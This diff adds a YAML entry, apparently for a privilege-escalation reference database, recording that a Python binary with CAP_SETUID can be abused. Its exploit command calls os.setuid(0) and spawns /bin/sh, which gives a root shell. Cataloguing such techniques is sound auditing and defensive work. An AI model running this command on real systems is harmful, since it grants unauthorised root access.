@@ -1,0 +1,6 @@
+name: python
+binary_path: /usr/bin/python
+exploit_cmds:
+- /usr/bin/python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+required_caps:
+- CAP_SETUID
